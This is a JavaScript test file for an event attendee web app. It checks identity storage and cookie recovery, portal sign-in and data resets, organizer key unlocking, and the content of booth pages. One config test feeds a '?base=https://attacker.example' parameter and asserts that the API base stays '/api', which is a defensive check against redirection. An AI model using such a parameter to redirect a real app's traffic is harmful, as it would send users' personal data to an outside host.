          attendeeId,
          name: "Jordan Lee",
          raffleNumber: "1001",
          phoneLinked: true,
          serverNow: "2026-07-18T20:11:00.000Z",
          dataResetAt: "initial",
        };
      },
    },
    EventSchedule: {
      syncSamples: [],
      sync(serverNow, requestStartedMs, responseReceivedMs) {
        this.syncSamples.push({ serverNow, requestStartedMs, responseReceivedMs });
      },
    },
  };
  vm.createContext(identityContext);
  const identitySource = fs.readFileSync(path.join(__dirname, "..", "..", "web", "shared", "identity.js"), "utf8");
  vm.runInContext(`${identitySource}\nthis.__identity = Identity;`, identityContext);
  assert.match(identitySource, /eventapp_attendee_id/);
  assert.match(identitySource, /sessionStorage\.setItem\(KEY, serialized\)/);
  assert.match(identitySource, /clearRecoveryCookie\(\)/);
  assert.equal(identityContext.__identity.peek().attendeeId, undefined);
  assert.equal(identityStorage.getItem("eventapp.identity"), null);
  assert.equal(identityContext.__identity.get().attendeeId, "generated-id");
  identityContext.__identity.clear();

  const attendeePortalSource = fs.readFileSync(path.join(__dirname, "..", "..", "web", "shared", "attendee-portal.js"), "utf8");
  vm.runInContext(`${attendeePortalSource}\nthis.__attendeePortal = AttendeePortal;`, identityContext);
  const attendeePortal = identityContext.__attendeePortal;
  let portalIdentity = await attendeePortal.signIn("phase2.heaven", "Jordan Lee", "6155550101");
  assert.equal(portalIdentity.attendeeId, "portal-attendee");
  assert.equal(portalIdentity.wristbandColor, "blue");
  assert.equal(portalIdentity.phone, "6155550101");
  assert.equal(identityStorage.getItem("eventapp.data-reset-at"), "initial");
  assert.equal(attendeePortal.hasAccess("phase2.heaven"), true);
  assert.equal(attendeePortal.hasAccess("phase2.trivia"), false);
  assert.equal(attendeePortal.hasAccess("phase3"), false);
  assert.deepEqual(backendPortalCalls[0], ["login", "phase2"]);
  assert.equal(identityContext.EventSchedule.syncSamples.length, 1);
  assert.equal(identityContext.EventSchedule.syncSamples[0].serverNow, "2026-07-18T20:10:00.000Z");
  assert.equal(Number.isFinite(identityContext.EventSchedule.syncSamples[0].requestStartedMs), true);
  assert.equal(Number.isFinite(identityContext.EventSchedule.syncSamples[0].responseReceivedMs), true);
  assert.ok(
    identityContext.EventSchedule.syncSamples[0].responseReceivedMs
      >= identityContext.EventSchedule.syncSamples[0].requestStartedMs
  );
  portalIdentity = await attendeePortal.restore("phase2.heaven");
  assert.equal(portalIdentity.phoneLinked, true);
  assert.equal(portalIdentity.wristbandColor, "blue");
  assert.deepEqual(backendPortalCalls[1], ["restore", "phase2"]);
  portalIdentity = await attendeePortal.continueAs("phase2");
  assert.equal(portalIdentity.attendeeId, "portal-attendee");
  assert.equal(portalIdentity.wristbandColor, "blue");
  assert.equal(attendeePortal.hasAccess("phase2"), true);
  assert.deepEqual(backendPortalCalls[2], ["restore", "phase2"]);
  await attendeePortal.signIn("phase2.trivia", "Jordan Lee", "6155550101");
  assert.equal(attendeePortal.hasAccess("phase2.heaven"), true);
  assert.equal(attendeePortal.hasAccess("phase2.trivia"), true);
  attendeePortal.clearAccess("phase2.heaven");
  assert.equal(attendeePortal.hasAccess("phase2.heaven"), false);
  assert.equal(attendeePortal.hasAccess("phase2.trivia"), true);
  await attendeePortal.signIn("phase3", "Jordan Lee", "6155550101");
  assert.equal(attendeePortal.hasAccess("phase2.trivia"), true);
  assert.equal(attendeePortal.hasAccess("phase3"), true);
  assert.equal(typeof attendeePortal.acceptDataReset, "function");
  assert.equal(typeof identityWindowListeners["eventapp:data-reset"], "function");

  // The first reset marker is only a baseline for this browser. A later,
  // changed marker represents an intentional organizer reset and must clear
  // both the attendee identity and saved journey/portal access before sending
  // the phone back through Phase 1.
  const attendeeJourneyKey = "eventapp.journey.v1.portal-attendee.phase3.draft";
  identityStorage.setItem(attendeeJourneyKey, JSON.stringify({ optionIds: ["future"] }));
  identityStorage.setItem("eventapp.pending-booth-checkins.v1", JSON.stringify([
    { payload: { attendeeId: "portal-attendee", boothId: "heaven" } },
  ]));
  identityWindowListeners["eventapp:data-reset"]({ detail: { dataResetAt: "initial" } });
  assert.equal(identityContext.__identity.peek().attendeeId, "portal-attendee");
  assert.equal(identityStorage.getItem("eventapp.data-reset-at"), "initial");
  identityWindowListeners["eventapp:data-reset"]({
    detail: { dataResetAt: "2026-07-16T12:00:00.000Z", changed: true },
  });
  assert.equal(identityContext.__identity.peek().attendeeId, undefined);
  assert.equal(identityStorage.getItem(attendeeJourneyKey), null);
  assert.equal(identityStorage.getItem("eventapp.pending-booth-checkins.v1"), null);
  assert.equal(identityStorage.getItem("eventapp.data-reset-at"), "2026-07-16T12:00:00.000Z");
  assert.equal(portalStorage.getItem("eventapp.portal.phase2.trivia"), null);
  assert.equal(portalStorage.getItem("eventapp.portal.phase3"), null);
  assert.equal(identityContext.window.location.href, "/phase1-entry/index.html?eventReset=1");

  // QR/in-app browsers sometimes reject localStorage. The attendee-id cookie
  // must still survive a fresh page context, and explicit logout/reset must
  // expire it rather than silently creating a new attendee on refresh.
  class ThrowingStorage {
    get length() { throw new Error("storage blocked"); }
    getItem() { throw new Error("storage blocked"); }
    setItem() { throw new Error("storage blocked"); }
    removeItem() { throw new Error("storage blocked"); }
    key() { throw new Error("storage blocked"); }
  }
  let recoveryCookie = "";
  const recoveryDocument = {};
  Object.defineProperty(recoveryDocument, "cookie", {
    get() { return recoveryCookie; },
    set(value) {
      const first = String(value).split(";")[0];
      recoveryCookie = /Max-Age=0/.test(String(value)) ? "" : first;
    },
  });
  const recoveryContext = () => ({
    window: {
      crypto: { randomUUID: () => "cookie-attendee" },
      location: { protocol: "https:" },
    },
    document: recoveryDocument,
    localStorage: new ThrowingStorage(),
    sessionStorage: new ThrowingStorage(),
  });
  const firstRecoveryContext = recoveryContext();
  vm.createContext(firstRecoveryContext);
  vm.runInContext(`${identitySource}\nthis.__identity = Identity;`, firstRecoveryContext);
  assert.equal(firstRecoveryContext.__identity.get().attendeeId, "cookie-attendee");
  assert.match(recoveryCookie, /eventapp_attendee_id=cookie-attendee/);
  const reloadedRecoveryContext = recoveryContext();
  vm.createContext(reloadedRecoveryContext);
  vm.runInContext(`${identitySource}\nthis.__identity = Identity;`, reloadedRecoveryContext);
  assert.equal(reloadedRecoveryContext.__identity.peek().attendeeId, "cookie-attendee");
  reloadedRecoveryContext.__identity.clear();
  assert.equal(recoveryCookie, "");

  const apiSource = fs.readFileSync(path.join(__dirname, "..", "..", "web", "shared", "api.js"), "utf8");
  const apiContext = {
    window: { EVENT_APP_CONFIG: { API_BASE_URL: "https://script.google.com/example/exec" } },
    URLSearchParams,
    fetch: async () => ({
      ok: true,
      status: 200,
      json: async () => ({ error: "Organizer access key is invalid.", code: "AUTH_REQUIRED" }),
    }),
  };
  vm.createContext(apiContext);
  vm.runInContext(`${apiSource}\nthis.__eventApi = EventAPI;`, apiContext);
  assert.equal(typeof apiContext.__eventApi.registerAttendee, "function");
  assert.equal(apiContext.__eventApi.startAttendeeRegistration, undefined);
  assert.equal(apiContext.__eventApi.verifyAttendeePhone, undefined);
  assert.equal(apiContext.__eventApi.resendAttendeePhoneCode, undefined);
  assert.equal(typeof apiContext.__eventApi.loginAttendee, "function");
  assert.equal(typeof apiContext.__eventApi.boothDashboardData, "function");
  assert.equal(typeof apiContext.__eventApi.boothPresentation, "function");
  assert.equal(typeof apiContext.__eventApi.updateBoothPresentation, "function");
  assert.equal(typeof apiContext.__eventApi.triviaState, "function");
  assert.equal(typeof apiContext.__eventApi.submitTriviaAnswer, "function");
  assert.equal(typeof apiContext.__eventApi.triviaDashboardData, "function");
  assert.equal(typeof apiContext.__eventApi.advanceTriviaSession, "function");
  assert.equal(typeof apiContext.__eventApi.resetTriviaSession, "function");
  assert.equal(typeof apiContext.__eventApi.completeTrivia, "function");
  assert.equal(typeof apiContext.__eventApi.heavenState, "function");
  assert.equal(typeof apiContext.__eventApi.confirmHeavenStep, "function");
  assert.equal(typeof apiContext.__eventApi.heavenDashboardData, "function");
  assert.equal(typeof apiContext.__eventApi.advanceHeavenSession, "function");
  assert.equal(typeof apiContext.__eventApi.resetHeavenSession, "function");
  assert.equal(typeof apiContext.__eventApi.artState, "function");
  assert.equal(typeof apiContext.__eventApi.artDashboardData, "function");
  assert.equal(typeof apiContext.__eventApi.advanceArtSession, "function");
  assert.equal(typeof apiContext.__eventApi.resetArtSession, "function");
  assert.equal(typeof apiContext.__eventApi.completeArt, "function");
  assert.equal(typeof apiContext.__eventApi.saveSongVote, "function");
  assert.equal(typeof apiContext.__eventApi.newSongState, "function");
  assert.equal(typeof apiContext.__eventApi.submitNewSongVote, "function");
  assert.equal(typeof apiContext.__eventApi.newSongDashboardData, "function");
  assert.equal(typeof apiContext.__eventApi.advanceNewSongSession, "function");
  assert.equal(typeof apiContext.__eventApi.resetNewSongSession, "function");
  assert.equal(typeof apiContext.__eventApi.completeNewSong, "function");
  assert.equal(typeof apiContext.__eventApi.eventClock, "function");
  assert.equal(typeof apiContext.__eventApi.setDemoClock, "function");
  assert.equal(typeof apiContext.__eventApi.setDemoClockAt, "function");
  assert.equal(typeof apiContext.__eventApi.saveSignupSelections, "function");
  assert.equal(typeof apiContext.__eventApi.mySignupSelections, "function");
  await assert.rejects(
    () => apiContext.__eventApi.dashboardData("wrong"),
    (error) => error.code === "AUTH_REQUIRED" && error.status === 200
  );

  const configSource = fs.readFileSync(path.join(__dirname, "..", "..", "web", "shared", "config.js"), "utf8");
  const publicContext = {
    window: { location: { search: "?base=https://attacker.example", hostname: "event.example" } },
    URLSearchParams,
  };
  vm.createContext(publicContext);
  vm.runInContext(configSource, publicContext);
  assert.equal(publicContext.window.EVENT_APP_CONFIG.API_BASE_URL, "/api");

  const localContext = {
    window: { location: { search: "?base=https://script.google.com/example/exec", hostname: "localhost" } },
    URLSearchParams,
  };
  vm.createContext(localContext);
  vm.runInContext(configSource, localContext);
  assert.equal(localContext.window.EVENT_APP_CONFIG.API_BASE_URL, "/api");

  class FakeElement {
    constructor() {
      this.style = {};
      this.value = "";
      this.textContent = "";
      this.disabled = false;
      this.listeners = {};
    }
    addEventListener(type, listener) { this.listeners[type] = listener; }
    click() {
      if (this.disabled || !this.listeners.click) return;
      return this.listeners.click({ type: "click" });
    }
    focus() {}
  }
  const authElements = {};
  [
    "organizer-access", "organizer-content", "organizer-key",
    "btn-organizer-unlock", "err-organizer-key", "btn-organizer-lock",
  ].forEach((id) => { authElements[id] = new FakeElement(); });
  let resolveVerification;
  let rejectVerification;
  let verificationCalls = 0;
  let unlockedCount = 0;
  const authContext = {
    console: { error() {} },
    document: { getElementById: (id) => authElements[id] || null },
    EventAPI: {
      verifyOrganizer: () => new Promise((resolve, reject) => {
        verificationCalls += 1;
        resolveVerification = resolve;
        rejectVerification = reject;
      }),
    },
  };
  vm.createContext(authContext);
  const authSource = fs.readFileSync(path.join(__dirname, "..", "..", "web", "shared", "organizer-auth.js"), "utf8");
  vm.runInContext(`${authSource}\nthis.__organizerAuth = OrganizerAuth;`, authContext);
  const auth = authContext.__organizerAuth;
  auth.init({ onUnlocked: () => { unlockedCount += 1; } });

  // Locking while verification is in flight invalidates that response, so it
  // cannot reveal stale kiosk/dashboard state after a later unlock.
  authElements["organizer-key"].value = "first-key";
  authElements["btn-organizer-unlock"].listeners.click();
  authElements["btn-organizer-lock"].listeners.click();
  resolveVerification({ ok: true });
  await new Promise((resolve) => setImmediate(resolve));
  assert.equal(auth.key(), "");
  assert.equal(unlockedCount, 0);
  assert.equal(authElements["organizer-content"].style.display, "none");

  authElements["organizer-key"].value = "working-key";
  authElements["btn-organizer-unlock"].listeners.click();
  resolveVerification({ ok: true });
  await new Promise((resolve) => setImmediate(resolve));
  assert.equal(auth.key(), "working-key");
  assert.equal(unlockedCount, 1);

  auth.lock();
  authElements["organizer-key"].value = "missing-config";
  authElements["btn-organizer-unlock"].listeners.click();
  const notConfigured = new Error("not configured");
  notConfigured.code = "ORGANIZER_KEY_NOT_CONFIGURED";
  rejectVerification(notConfigured);
  await new Promise((resolve) => setImmediate(resolve));
  assert.match(authElements["err-organizer-key"].textContent, /not been configured/);

  // Enter/Return uses the exact same guarded button path as a tap. It must
  // prevent native submission, ignore repeats while verification is pending,
  // and leave IME composition Enter untouched.
  auth.lock();
  authElements["organizer-key"].value = "keyboard-key";
  const callsBeforeKeyboardUnlock = verificationCalls;
  let enterPrevented = false;
  authElements["organizer-key"].listeners.keydown({
    key: "Enter",
    isComposing: false,
    repeat: false,
    preventDefault() { enterPrevented = true; },
  });
  assert.equal(enterPrevented, true);
  assert.equal(verificationCalls, callsBeforeKeyboardUnlock + 1);
  assert.equal(authElements["btn-organizer-unlock"].disabled, true);
  authElements["organizer-key"].listeners.keydown({
    key: "Return",
    isComposing: false,
    repeat: true,
    preventDefault() { throw new Error("repeat Return should not be handled"); },
  });
  assert.equal(verificationCalls, callsBeforeKeyboardUnlock + 1);
  resolveVerification({ ok: true });
  await new Promise((resolve) => setImmediate(resolve));
  assert.equal(auth.key(), "keyboard-key");
  assert.equal(unlockedCount, 2);

  auth.lock();
  let compositionPrevented = false;
  const callsBeforeComposition = verificationCalls;
  authElements["organizer-key"].listeners.keydown({
    key: "Enter",
    isComposing: true,
    repeat: false,
    preventDefault() { compositionPrevented = true; },
  });
  assert.equal(compositionPrevented, false);
  assert.equal(verificationCalls, callsBeforeComposition);
  assert.doesNotMatch(authSource, /sessionStorage|localStorage/);

  const dashboardSource = fs.readFileSync(path.join(__dirname, "..", "..", "web", "organizer", "dashboard.html"), "utf8");
  const artKioskSource = fs.readFileSync(path.join(__dirname, "..", "..", "web", "phase2-booths", "kiosk-art.html"), "utf8");
  const songKioskSource = fs.readFileSync(path.join(__dirname, "..", "..", "web", "phase2-booths", "kiosk-newsong.html"), "utf8");
  const artRoomSource = fs.readFileSync(path.join(__dirname, "..", "..", "web", "phase2-booths", "booth-art.html"), "utf8");
  const artAttendeeSource = fs.readFileSync(path.join(__dirname, "..", "..", "web", "shared", "art-attendee.js"), "utf8");
  const artStaffPageSource = fs.readFileSync(path.join(__dirname, "..", "..", "web", "phase2-staff", "art.html"), "utf8");
  const artStaffSource = fs.readFileSync(path.join(__dirname, "..", "..", "web", "shared", "art-staff.js"), "utf8");
  const storyRoomSource = fs.readFileSync(path.join(__dirname, "..", "..", "web", "phase2-booths", "booth-story.html"), "utf8");
  const storyAttendeeSource = fs.readFileSync(path.join(__dirname, "..", "..", "web", "shared", "story-attendee.js"), "utf8");
  const phase1Source = fs.readFileSync(path.join(__dirname, "..", "..", "web", "phase1-entry", "index.html"), "utf8");
  const phase2Source = fs.readFileSync(path.join(__dirname, "..", "..", "web", "phase2-booths", "hub.html"), "utf8");
  const phase3Source = fs.readFileSync(path.join(__dirname, "..", "..", "web", "phase3-signup", "index.html"), "utf8");
  const doneSource = fs.readFileSync(path.join(__dirname, "..", "..", "web", "done", "index.html"), "utf8");
  const organizerDirectorySource = fs.readFileSync(path.join(__dirname, "..", "..", "web", "organizer", "index.html"), "utf8");
  const boothRoomSource = fs.readFileSync(path.join(__dirname, "..", "..", "web", "shared", "booth-room.js"), "utf8");
  const boothCommonSource = fs.readFileSync(path.join(__dirname, "..", "..", "web", "shared", "booth-common.js"), "utf8");
  const newSongSource = fs.readFileSync(path.join(__dirname, "..", "..", "web", "phase2-booths", "booth-newsong.html"), "utf8");
  const newSongAttendeeSource = fs.readFileSync(path.join(__dirname, "..", "..", "web", "shared", "newsong-attendee.js"), "utf8");
  const newSongStaffPageSource = fs.readFileSync(path.join(__dirname, "..", "..", "web", "phase2-staff", "newsong.html"), "utf8");
  const newSongStaffControllerSource = fs.readFileSync(path.join(__dirname, "..", "..", "web", "shared", "newsong-staff.js"), "utf8");
  const triviaRoomSource = fs.readFileSync(path.join(__dirname, "..", "..", "web", "phase2-booths", "booth-trivia.html"), "utf8");
  const triviaAttendeeSource = fs.readFileSync(path.join(__dirname, "..", "..", "web", "shared", "trivia-attendee.js"), "utf8");
  const triviaStaffPageSource = fs.readFileSync(path.join(__dirname, "..", "..", "web", "phase2-staff", "trivia.html"), "utf8");
  const triviaStaffSource = fs.readFileSync(path.join(__dirname, "..", "..", "web", "shared", "trivia-staff.js"), "utf8");
  const heavenRoomSource = fs.readFileSync(path.join(__dirname, "..", "..", "web", "phase2-booths", "booth-heaven.html"), "utf8");
  const heavenAttendeeSource = fs.readFileSync(path.join(__dirname, "..", "..", "web", "shared", "heaven-attendee.js"), "utf8");
  const heavenStaffPageSource = fs.readFileSync(path.join(__dirname, "..", "..", "web", "phase2-staff", "heaven.html"), "utf8");
  const heavenStaffSource = fs.readFileSync(path.join(__dirname, "..", "..", "web", "shared", "heaven-staff.js"), "utf8");
  [
    [triviaStaffSource, "trivia"],
    [heavenStaffSource, "heaven"],
    [artStaffSource, "art"],
    [newSongStaffControllerSource, "newsong"],
  ].forEach(([source, boothId]) => {
    assert.match(source, /Live rotation changed/);
    assert.match(source, /Switch sessions and review the next step before publishing anything to attendee phones\./);
    assert.match(source, new RegExp(`data-${boothId}-switch-session`));
    assert.match(source, /No attendee screen changed\./);
    assert.match(source, /One tap updates everyone in this session\./);
  });
  const boothsConfigSource = fs.readFileSync(path.join(__dirname, "..", "..", "web", "shared", "booths-config.js"), "utf8");
  const boothsConfigContext = {};
  vm.createContext(boothsConfigContext);
  vm.runInContext(`${boothsConfigSource}\nthis.__booths = CONNECTOR_BOOTHS; this.__wristbandColors = WRISTBAND_COLORS; this.__routes = WRISTBAND_ROUTES; this.__sessions = BOOTH_SESSIONS;`, boothsConfigContext);
  const boothConfigs = Array.from(boothsConfigContext.__booths, (booth) => ({ ...booth }));
  const eventScheduleSource = fs.readFileSync(path.join(__dirname, "..", "..", "web", "shared", "event-schedule.js"), "utf8");
  vm.runInContext(`${eventScheduleSource}\nthis.__eventSchedule = EventSchedule;`, boothsConfigContext);
  const eventSchedule = boothsConfigContext.__eventSchedule;
  assert.match(dashboardSource, /if \(!OrganizerAuth\.isCurrent\(authGeneration\)\) return false/);
  assert.match(dashboardSource, /groupSignupsByOption\(data\.signups\)/);
  assert.match(dashboardSource, /Phone\.formatDisplay\(s\.phone\)/);
  assert.match(dashboardSource, /EventAPI\.dashboardData\(/);
  assert.match(dashboardSource, /id="btn-apply-demo-time" aria-pressed="false"/);
  assert.match(dashboardSource, /latestDemoClockMode === "custom"/);
  assert.match(dashboardSource, /\.demo-timeline-actions \.btn\[aria-pressed="true"\]/);
  assert.match(dashboardSource, /const targetMs = snapshot && snapshot\.nowMs/);
  assert.match(dashboardSource, /const eventTimeZone = "America\/Chicago"/);
  assert.match(dashboardSource, /demoTimelineOffsetSeconds = clampTimelineOffset\(\(targetMs - demoEventStartMs\) \/ 1000\)/);
  assert.match(dashboardSource, /demoClockReadoutTimer = setInterval\(renderDemoClock, 1000\)/);
  assert.match(dashboardSource, /if \(remoteClockChanged\) demoTimelineDirty = false/);
  assert.match(dashboardSource, /if \(!demoTimeInputEditing\) input\.value = timelineInputValue\(\)/);
  assert.doesNotMatch(dashboardSource, /id="trivia-table"|id="song-table"/);
  assert.match(dashboardSource, /boothOnlyCountKeys = new Set\(\["triviaanswers", "songvotes"\]\)/);
  assert.doesNotMatch(dashboardSource, /triviaAnswers:\s*"Bible Bowl answers"|songVotes:\s*"New Song votes"/);
  assert.ok(
    dashboardSource.indexOf("} else if (failed) {") < dashboardSource.indexOf("} else if (pending) {"),
    "a failed Sheet export should take visual priority over its queued retry"
  );
  assert.match(dashboardSource, /\(pending && !failed\)/);
  assert.match(dashboardSource, /failed \? "Retry now"/);
  assert.match(dashboardSource, /document\.getElementById\("sheet-export-card"\)\.style\.display = "none"/);
  assert.doesNotMatch(dashboardSource, /id="signup-table"/);
  listHtmlFiles(webRoot).forEach((filename) => {
    const source = fs.readFileSync(filename, "utf8");
    assert.doesNotMatch(
      source,
      /Local demo default|Production uses the key configured|All staff pages currently use the same event organizer key/i,
      filename
    );
  });
  [artRoomSource, storyRoomSource, artKioskSource].forEach((source) => {
    assert.doesNotMatch(source, /id="booth-note"|id="booth-stars"|Rate this booth|Anything you'd like to share/i);
  });
  assert.doesNotMatch(artKioskSource, /\brating\s*:|\bstars\s*=/);
  assert.match(artKioskSource, /OrganizerAuth\.isCurrent\(authGeneration\)/);
  assert.match(songKioskSource, /let isSaving = false/);
  assert.match(songKioskSource, /if \(isSaving \|\| !currentVisitor\) return/);
  assert.match(phase1Source, /name="wristband-color"/);
  assert.match(phase1Source, /EventAPI\.confirmWristband\(identity\.attendeeId, selectedWristbandColor\)/);
  assert.match(phase1Source, /shared\/event-schedule\.js/);
  assert.match(phase1Source, /id="btn-enter-gym" disabled>Next →<\/button>/);
  assert.doesNotMatch(phase1Source, /Complete Phase 1|Phase 1 of 3/);
  assert.match(phase1Source, /window\.location\.href = EventSchedule\.linkWithPreview\("\.\.\/phase2-booths\/hub\.html"\)/);
  assert.match(phase1Source, /function resumeSavedAttendee\(\)/);
  assert.match(phase1Source, /AttendeePortal\.continueAs\("phase1"\)/);
  assert.match(phase1Source, /saved\.phase3CompletedAt/);
  assert.match(phase1Source, /await phase1DemoClockReady/);
  assert.match(phase1Source, /AttendeePortal\.acceptDataReset\(result\.dataResetAt\)/);
  assert.match(phase1Source, /id="event-reset-note"/);
  assert.match(phase1Source, /id="phase1-event-notice"/);
  assert.match(phase1Source, /It's time for the main message\./);
  assert.match(phase1Source, /AttendeeMenu\.mount\("phase1-attendee-menu"/);
  assert.match(phase1Source, /id="in-phone"[^>]*autocomplete="tel-national"/);
  assert.doesNotMatch(phase1Source, /id="in-otp"|one-time-code/i);
  assert.match(phase1Source, /EventAPI\.registerAttendee\(identity\.attendeeId, name, phone\)/);
  assert.match(phase1Source, /returnLinkMode[\s\S]*EventAPI\.loginAttendee\(name, phone, "phase1"\)/);
  assert.doesNotMatch(
    phase1Source,
    /EventAPI\.(?:startAttendeeRegistration|verifyAttendeePhone|resendAttendeePhoneCode)/
  );
  assert.match(phase1Source, /\[\["in-name", "btn-welcome-next"\], \["in-phone", "btn-welcome-next"\]/);
  assert.doesNotMatch(phase1Source, /id="s-complete"/);
  assert.match(phase2Source, /shared\/attendee-portal\.js/);
  assert.match(phase2Source, /shared\/event-schedule\.js/);
  assert.match(phase2Source, /AttendeePortal\.signIn\(PORTAL/);
  assert.match(phase2Source, /AttendeePortal\.continueAs\(PORTAL\)/);
  assert.match(phase2Source, /id="btn-phase2-login">Next →<\/button>/);
  assert.doesNotMatch(phase2Source, /Open my schedule/);
  assert.match(phase2Source, /EventSchedule\.currentBooth/);
  assert.match(phase2Source, /EventAPI\.boothPresentation/);
  assert.match(phase2Source, /id="btn-open-booth-activity"/);
  assert.match(phase2Source, /EventSchedule\.linkWithPreview\(currentBooth\.page\)/);
  assert.match(phase2Source, /presentationPollMs = Math\.round\(5000 \* \(0\.85 \+ Math\.random\(\) \* 0\.3\)\)/);
  assert.match(phase2Source, /if \(!document\.hidden && activeBoothId\) loadPresentation/);
  assert.doesNotMatch(phase2Source, /first-booth-phone|btn-skip-first-booth-phone|findOrRegisterByPhone/);
  assert.match(phase2Source, /id="attendee-name"/);
  assert.match(phase2Source, /id="attendee-raffle"/);
  assert.match(phase2Source, /id="session-countdown"/);
  assert.match(phase2Source, /id="phase3-ready"/);
  assert.match(phase2Source, /id="waiting-lobby"/);
  assert.match(phase2Source, /The main message is starting/);
  assert.match(phase2Source, /const cachedIdentity = Identity\.peek\(\)/);
  assert.match(phase2Source, /AttendeeMenu\.mount\("phase2-attendee-menu"/);
  assert.match(phase2Source, /function routeIsComplete\(\)/);
  assert.match(phase2Source, /data-open-current/);
  assert.match(phase2Source, /Ended · Not visited/);
  assert.match(phase2Source, /phase3\.href = EventSchedule\.linkWithPreview\("\.\.\/phase3-signup\/index\.html"\)/);
  assert.match(phase2Source, /\["phase2-name", "phase2-phone"\]/);
  assert.match(phase2Source, /id="phase2-phone"[^>]*autocomplete="tel-national"/);
  assert.match(phase2Source, /const completionLivesInActivity = \["trivia", "heaven", "story", "art", "newsong"\]\.includes\(currentBooth\.id\)/);
  assert.match(phase2Source, /Finish \$\{currentBooth\.title\} from its final screen/);
  assert.match(phase2Source, /serverScreenTitle\s*\?\s*"Leader screen · Current activity"/);
  assert.match(phase2Source, /tap Finish booth on its final screen/);
  assert.doesNotMatch(phase2Source, /tap Done on its final screen/);
  assert.match(phase2Source, /booth\.id === "story" && \["paused", "wrap"\]\.includes\(state\.status\)/);
  assert.doesNotMatch(phase2Source, /window\.location\.href = "\.\.\/phase3-signup\/index\.html"/);
  assert.match(boothRoomSource, /const portal = `phase2\.\$\{boothId\}`/);
  assert.match(boothRoomSource, /AttendeePortal\.signIn\(portal/);
  assert.match(boothRoomSource, /const savedIdentity = Identity\.peek\(\)/);
  assert.doesNotMatch(boothRoomSource, /AttendeePortal\.hasAccess\("phase2"\)/);
  assert.match(boothRoomSource, /AttendeePortal\.continueAs\(portal\)/);
  assert.match(boothRoomSource, /AttendeeMenu\.mount\(id, \{ identity: currentIdentity, logoutUrl \}\)/);
  assert.match(boothRoomSource, /roomCompleted = roomCompleted \|\| \(checkins\.boothIds \|\| \[\]\)\.includes\(boothId\)/);
  assert.match(boothRoomSource, /id="booth-welcome-raffle"/);
  assert.match(boothRoomSource, /id="booth-login-name"[^>]*autocomplete="off"/);
  assert.match(boothRoomSource, /id="booth-login-phone"[^>]*autocomplete="tel-national"/);
  assert.match(boothRoomSource, /kicker: "Message time"/);
  assert.match(boothRoomSource, /title: "It's time for the main message\."/);
  assert.match(boothRoomSource, /\[nameInput, phoneInput\][\s\S]*addEventListener\("keydown"/);
  assert.doesNotMatch(boothCommonSource, /findOrRegisterByPhone|booth-phone-input|btn-booth-checkin/);
  assert.doesNotMatch(boothCommonSource, /hub\.html/);
  assert.match(boothCommonSource, /completeBoothRoom/);
  assert.match(boothCommonSource, /const identity = _boothIdentity \|\| Identity\.peek\(\)/);
  assert.doesNotMatch(boothCommonSource, /phoneSkipped/);
  [artRoomSource, storyRoomSource, newSongSource, triviaRoomSource, heavenRoomSource].forEach((source) => {
    assert.doesNotMatch(source, /id="booth-phone-input"|id="btn-booth-checkin"/);
  });

  // The Heaven Booth is paced entirely by the booth leader. Attendee phones
  // render only the published presentation step; there are no local answers,
  // Next/Back controls, or completion action before the Thank you screen.
  assert.match(storyRoomSource, /shared\/story-attendee\.js/);
  assert.match(storyRoomSource, /StoryAttendee\.init\(/);
  assert.match(storyRoomSource, /const BOOTH_NAME = "The Heaven Booth"/);
  assert.doesNotMatch(storyRoomSource, /JourneyState|STORY_BEATS|story-input|btn-story-(?:next|prev)|<input|<textarea/);
  assert.match(storyAttendeeSource, /EventAPI\.boothPresentation\(BOOTH_ID\)/);
  assert.match(storyAttendeeSource, /updatedMs < snapshot\.session\.startMs/);
  assert.match(storyAttendeeSource, /const FINAL_STEP_INDEX = 12/);
  assert.equal((storyAttendeeSource.match(/type: "verse"/g) || []).length, 4);
  [
    "Matthew 13:31–32",
    "Matthew 13:33",
    "Matthew 13:44",
    "Matthew 13:47–48",
    "about sixty pounds of flour",
    "collected the good fish in baskets",
    "All rights reserved worldwide.",
  ].forEach((copy) => assert.ok(storyAttendeeSource.includes(copy), copy));
  [
    "heaven-booth-mustard-seed.png",
    "heaven-booth-yeast.png",
    "heaven-booth-treasure.png",
    "heaven-booth-net.png",
  ].forEach((filename) => {
    assert.ok(storyAttendeeSource.includes(filename), filename);
    assert.ok(fs.statSync(path.join(__dirname, "..", "..", "web", "assets", filename)).size > 0, filename);
  });
  assert.match(storyAttendeeSource, /<h2>The Heaven Booth<\/h2>/);
  assert.match(storyAttendeeSource, /<h2>Thank you<\/h2>/);
  assert.match(storyAttendeeSource, /id="btn-booth-done"/);
  assert.match(storyAttendeeSource, /\["live", "paused", "wrap"\]\.includes\(savedStatus\)[\s\S]*?: "waiting"/);
  assert.match(storyAttendeeSource, /else if \(stepIndex >= FINAL_STEP_INDEX\)[\s\S]*?FINAL_STEP_INDEX - 1/);
  assert.doesNotMatch(storyAttendeeSource, /story-leader-state|value\.status === "paused"|value\.status === "wrap"/);
  assert.doesNotMatch(storyAttendeeSource, /score|leaderboard|data-story-answer|btn-story-(?:next|prev)/i);

  // Bible Bowl questions are now speaker-controlled and server-scored. The
  // attendee bundle has no answer-key data or local Next-question mechanism;
  // it can only render the four backend phases and submit one selected choice.
  const attendeeTriviaBundle = [boothsConfigSource, triviaRoomSource, triviaAttendeeSource].join("\n");
  assert.doesNotMatch(attendeeTriviaBundle, /\bTRIVIA_QUESTIONS\b/);
  assert.doesNotMatch(attendeeTriviaBundle, /\bcorrectIndex\s*:/);
  assert.doesNotMatch(attendeeTriviaBundle, /btn-trivia-next|triviaState\.index|score\s*\+=/);
  assert.match(triviaRoomSource, /shared\/trivia-attendee\.js/);
  assert.match(triviaRoomSource, /TriviaAttendee\.init\(/);
  assert.match(triviaRoomSource, /onCompleted: \(\) => window\.completeBoothRoom\(BOOTH_NAME\)/);
  assert.doesNotMatch(triviaRoomSource, /id="btn-booth-done"|id="booth-stars"|id="booth-note"/);
  assert.match(triviaAttendeeSource, /new Set\(\["welcome", "question", "reveal", "complete"\]\)/);
  assert.match(triviaAttendeeSource, /EventAPI\.triviaState\(identity\.attendeeId\)/);
  assert.match(triviaAttendeeSource, /EventAPI\.submitTriviaAnswer\(identity\.attendeeId, previousState\.question\.id, answerIndex\)/);
  assert.match(triviaAttendeeSource, /EventAPI\.completeTrivia\(identity\.attendeeId\)/);
  assert.match(triviaAttendeeSource, /data-trivia-answer/);
  assert.match(triviaAttendeeSource, /btn-trivia-done/);
  assert.match(triviaAttendeeSource, /I wonder if it's correct/);
  assert.match(triviaAttendeeSource, /runId: String\(raw\.runId \|\| ""\)/);
